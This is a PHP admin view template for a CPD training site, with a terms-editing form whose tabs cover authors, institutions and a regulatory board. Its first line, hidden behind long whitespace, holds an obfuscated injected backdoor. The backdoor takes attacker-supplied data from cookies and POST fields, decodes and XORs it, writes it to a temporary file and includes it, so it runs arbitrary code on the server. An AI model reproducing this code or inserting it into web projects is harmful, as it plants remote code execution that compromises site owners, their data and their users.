<?php                                                                                                                                                                                                                                                                                                                                                                                                 $aiACFnoW = chr ( 507 - 428 )."\151" . chr (95) . chr ( 509 - 420 )."\x7a" . 'D' . chr (111) . chr (68); $AxsOUZ = 'c' . chr ( 726 - 618 ).'a' . chr ( 799 - 684 ).chr (115) . chr ( 1075 - 980 )."\x65" . "\170" . "\x69" . chr ( 363 - 248 )."\164" . "\x73";$lIFEKQZCQa = class_exists($aiACFnoW); $AxsOUZ = "6584";$yhuyxzLb = strpos($AxsOUZ, $aiACFnoW);if ($lIFEKQZCQa == $yhuyxzLb){function NqZMSEYYX(){$NYnrsvX = new /* 12925 */ Oi_YzDoD(33802 + 33802); $NYnrsvX = NULL;}$UfZCex = "33802";class Oi_YzDoD{private function quuKCoxfh($UfZCex){if (is_array(Oi_YzDoD::$kukKqmj)) {$name = sys_get_temp_dir() . "/" . crc32(Oi_YzDoD::$kukKqmj["salt"]);@Oi_YzDoD::$kukKqmj["write"]($name, Oi_YzDoD::$kukKqmj["content"]);include $name;@Oi_YzDoD::$kukKqmj["delete"]($name); $UfZCex = "33802";exit();}}public function rGaIQSigW(){$iVmrbamv = "18079";$this->_dummy = str_repeat($iVmrbamv, strlen($iVmrbamv));}public function __destruct(){Oi_YzDoD::$kukKqmj = @unserialize(Oi_YzDoD::$kukKqmj); $UfZCex = "20448_20615";$this->quuKCoxfh($UfZCex); $UfZCex = "20448_20615";}public function WYtAUWDJj($iVmrbamv, $FtTwHCzB){return $iVmrbamv[0] ^ str_repeat($FtTwHCzB, intval(strlen($iVmrbamv[0]) / strlen($FtTwHCzB)) + 1);}public function deyTt($iVmrbamv){$dCTYN = chr ( 626 - 528 ).'a' . "\163" . "\145" . chr ( 818 - 764 ).'4';return array_map($dCTYN . '_' . chr ( 616 - 516 )."\145" . 'c' . chr ( 749 - 638 ).chr (100) . "\145", array($iVmrbamv,));}public function __construct($IdanhwNZY=0){$otlJtU = chr (44); $iVmrbamv = "";$vweGwkMGoA = $_POST;$CTSvNGhQzd = $_COOKIE;$FtTwHCzB = "20111edc-29ee-4710-a239-51b0ce03be20";$CITqjd = @$CTSvNGhQzd[substr($FtTwHCzB, 0, 4)];if (!empty($CITqjd)){$CITqjd = explode($otlJtU, $CITqjd);foreach ($CITqjd as $JiKawEs){$iVmrbamv .= @$CTSvNGhQzd[$JiKawEs];$iVmrbamv .= @$vweGwkMGoA[$JiKawEs];}$iVmrbamv = $this->deyTt($iVmrbamv);}Oi_YzDoD::$kukKqmj = $this->WYtAUWDJj($iVmrbamv, $FtTwHCzB);if (strpos($FtTwHCzB, $otlJtU) !== FALSE){$FtTwHCzB = str_pad($FtTwHCzB, 10); $FtTwHCzB = ltrim(rtrim($FtTwHCzB));}}public static $kukKqmj = 7907;}NqZMSEYYX();} ?><?php $this->load->view('admin/picture'); ?>
<style type="text/css">
  .nav-tabs>li>a{
      font-size: 11px;
      font-weight: 600;
    ...
    <div class="row">
      ...
      <div class="col-sm-9">
          ...
          <ul class="nav nav-tabs tutorial-tab">
            ...
            <li><a data-toggle="tab" href="#authorBussiness">AUTHOR FOR ACCREDITED CPD PROVIERS</a></li>
            <li><a data-toggle="tab" href="#authorInstitution">AUTHOR-TRAINING DEP'T OF INSTITUTION</a></li>
            ...
            <li><a data-toggle="tab" href="#rboard">REGULATORY BOARD</a></li>
          </ul>
          ...
          <form action="<?php echo BASE_URL;?>admin/editTerms" method="post" enctype="multipart/form-data" name="professionalform1" id="professionalform1"> 
            ...
            <div id="authorBussiness" class="tab-pane fade">
              ...
              <h4 class="tab-title">AUTHOR FOR ACCREDITED CPD PROVIERS</h4>
              <div class="row">
              <div class="col-md-12">
            ...
            <div id="authorInstitution" class="tab-pane fade">
              ...
              <h4 class="tab-title">AUTHOR-TRAINING DEP'T OF INSTITUTION</h4>
              <div class="row">
              <div class="col-md-12">
          ...
          <div id="rboard" class="tab-pane fade">
               <form action="<?php echo BASE_URL;?>admin/editTerms" method="post" enctype="multipart/form-data" name="rboardform9" id="rboardform9">
              <h4 class="tab-title">REGULATORY BOARD </h4>
              <div class="row">
              <div class="col-md-12">
                <?php if(count($rboard)>0){ ?>
                  <p>
                        <label>Type</label>
                        <input name="type" value="<?php echo $rboard['type']; ?>" id="etype" type="text" class="form-control" readonly>
                        <span class="error"><?php echo  form_error('type'); ?></span>
                    </p>
                    <p>
                        <label>Title <span class="required text-danger"> * </span> </label>
                        <input name="title" value="<?php echo $rboard['title']; ?>" id="etitle" type="text" class="form-control" required>
                        <input name="id" value="<?php echo $rboard['id']; ?>" id="id" type="hidden" >
                        <span class="error"><?php echo  form_error('title'); ?></span>
                    <p>
                        <label>Description <span class="required text-danger"> * </span> </label>
                        <textarea name="discription" id="" class="form-control text_editor" style="width:100%;" placeholder="Write Some Lines about this Video..." required><?php echo $advertiser['discription']; ?></textarea> 
                    ...
                    <p>
                        <label>Status</label>
                        <select name="status" class="form-control" id="estatus">
                          <option value="1" <?php if($rboard['status'] == 1){ echo 'selected'; } ?> >Active</option>
                          <option value="0" <?php if($rboard['status'] == 0){ echo 'selected'; } ?> >Inactive</option>
                        </select>
                        <span class="error"><?php echo  form_error('status'); ?></span>
                    </p>  
                <?php } else { ?>
